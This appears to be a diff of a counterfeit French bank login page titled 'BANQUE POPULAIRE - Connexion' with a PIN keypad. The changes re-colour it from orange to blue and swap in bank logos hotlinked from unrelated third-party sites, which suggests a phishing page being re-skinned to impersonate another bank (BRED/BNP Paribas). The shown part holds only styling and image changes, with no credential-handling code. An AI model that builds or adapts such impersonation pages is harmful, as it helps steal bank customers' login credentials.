@@ -3,13 +3,13 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>BANQUE POPULAIRE - Connexion</title>
+  <title> BANQUE POPULAIRE - Connexion</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-<style>
+ <style>
   body {
     margin: 0;
     font-family: Arial, sans-serif;
-    background: linear-gradient(to bottom, #ff8c00, #ffa733);
+    background: linear-gradient(to bottom, #1f75b4, #4a9bd8);
     color: white;
   }
 
@@ -27,7 +27,7 @@
 
   header .icons i {
     font-size: 18px;
-    color: #ff8c00;
+    color: #1f75b4;
     margin-left: 15px;
   }
 
@@ -51,7 +51,7 @@
   }
 
   input[disabled] {
-    background-color: #f9cc99;
+    background-color: #8cbbe2;
     color: #fff;
   }
 
@@ -64,35 +64,35 @@
 
   .keypad button {
     background-color: white;
-    color: #ff8c00;
+    color: #1f75b4;
     font-weight: bold;
     border-radius: 5px;
   }
 
-  button.submit {
-    background-color: black;
-    color: white;
-    font-weight: bold;
-    padding: 12px 30px;
-    border: none;
-    border-radius: 30px;
-    font-size: 16px;
-    cursor: pointer;
-    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-    transition: transform 0.3s ease, background-color 0.3s ease, box-shadow 0.3s ease;
-    display: block;
-    margin: 20px auto;
-    text-align: center;
-  }
+      button.submit {
+  background-color: black;
+  color: white;
+  font-weight: bold;
+  padding: 12px 30px;
+  border: none;
+  border-radius: 30px;
+  font-size: 16px;
+  cursor: pointer;
+  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+  transition: transform 0.3s ease, background-color 0.3s ease, box-shadow 0.3s ease;
+  display: block;
+  margin: 20px auto; /* Centrage horizontal */
+  text-align: center;
+}
 
-  button.submit:hover {
-    background-color: #333;
-    transform: scale(1.05);
-    box-shadow: 0 6px 16px rgba(0, 0, 0, 0.15);
-  }
+button.submit:hover {
+  background-color: black;
+  transform: scale(1.05);
+  box-shadow: 0 6px 16px rgba(0, 0, 0, 0.15);
+}
 
   a {
-    color: #ffe2c4;
+    color: #c0e3ff;
     font-size: 0.9em;
     display: block;
     margin-top: 10px;
@@ -114,11 +114,10 @@
 
   .bottom-section h3 i {
     margin-right: 8px;
-    color: #ff8c00;
   }
 
   .bottom-section a {
-    color: #ff8c00;
+    color: #1f75b4;
     text-decoration: underline;
   }
 
@@ -135,7 +134,7 @@
   }
 
   footer h3 {
-    color: #ffc966;
+    color: #89cbff;
     font-size: 0.9em;
     margin-top: 15px;
   }
@@ -156,60 +155,59 @@
 
   .social i {
     margin: 0 10px;
-    color: #ff8c00;
+    color: #1f75b4;
   }
-
   /* Préchargement */
-  #preloader {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: white;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    z-index: 9999;
-    animation: fadeOut 1s ease-out forwards;
-    animation-delay: 2.5s;
-  }
+#preloader {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: white;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 9999;
+  animation: fadeOut 1s ease-out forwards;
+  animation-delay: 2.5s;
+}
 
-  #preloader img {
-    width: 100px;
+#preloader img {
+  width: 100px;
+  opacity: 0;
+  transform: scale(0.5);
+  animation: zoomIn 2s ease-out forwards;
+}
+
+@keyframes zoomIn {
+  to {
+    opacity: 1;
+    transform: scale(1.5);
+  }
+}
+
+@keyframes fadeOut {
+  to {
     opacity: 0;
-    transform: scale(0.5);
-    animation: zoomIn 2s ease-out forwards;
+    visibility: hidden;
   }
+}
 
-  @keyframes zoomIn {
-    to {
-      opacity: 1;
-      transform: scale(1.5);
-    }
-  }
+/* Contenu principal masqué au départ */
+body main {
+  opacity: 0;
+  transition: opacity 1s ease-in;
+}
 
-  @keyframes fadeOut {
-    to {
-      opacity: 0;
-      visibility: hidden;
-    }
-  }
-
-  /* Contenu principal masqué au départ */
-  body main {
-    opacity: 0;
-    transition: opacity 1s ease-in;
-  }
 </style>
-
 
 </head>
 <body>
   <main style="display: none;">
   <header>
 
-    <img src="https://storage.googleapis.com/endurance-apps-liip/media/cache/theming_no_filter_grid_fs/65003414cffc8657ec0129a6" width="150" alt="">
+    <img src="https://www.fondationbci.nc/wp-content/themes/bci-fondation-child/img/logo-bred@2x.png" width="150" alt="BNP Paribas">
     <div class="icons">
       <i class="fas fa-search"></i>
       <i class="fas fa-lock"></i>
@@ -293,7 +291,7 @@
   </main>
 
   <div id="preloader">
-  <img src="https://upload.wikimedia.org/wikipedia/fr/thumb/2/22/Banquepopulaire_logo.svg/2023px-Banquepopulaire_logo.svg.png" alt="Logo">
+  <img src="https://cdn.livestorm.co/uploads/organization/avatar/3c48b29c-fa2e-4505-af81-ae71f69e8bca/size_120x120_6703678d-3ee8-460e-9073-001933751746.png?v=1643622251" alt="Logo">
 </div>
 
 </body>
